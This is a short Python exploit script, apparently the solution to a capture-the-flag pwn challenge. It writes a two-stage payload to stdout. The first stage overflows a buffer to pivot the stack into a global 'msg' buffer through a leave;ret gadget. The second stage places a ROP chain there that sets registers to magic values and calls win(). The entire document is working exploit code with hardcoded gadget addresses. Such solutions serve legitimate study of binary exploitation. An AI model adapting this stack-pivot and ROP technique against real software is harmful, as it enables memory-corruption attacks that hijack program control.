#!/usr/bin/env python3
import sys
from struct import pack

addr_msg    = 0x404060  # msg
addr_win    = 0x4011e6  # win()
addr_leave  = 0x4011e4  # leave  ; ret  ;
addr_rdi    = 0x4012a3  # pop rdi ; ret  ;
addr_rsi_8  = 0x4012a1  # pop rsi ; pop r15 ; ret  ;
offset      = 0xc0

exploit_1  = b'a'*0x10
exploit_1 += pack('<Q', addr_msg+offset - 8)
exploit_1 += pack('<Q', addr_leave)
sys.stdout.buffer.write(exploit_1[:-1])

exploit_2  = b'\x00'*offset
exploit_2 += pack('<QQ' , addr_rdi,   0xcafebabe)
exploit_2 += pack('<QQQ', addr_rsi_8, 0xc0bebeef, 0xdeadbeef)
exploit_2 += pack('<Q'  , addr_win)
sys.stdout.buffer.write(exploit_2 + b'\n')
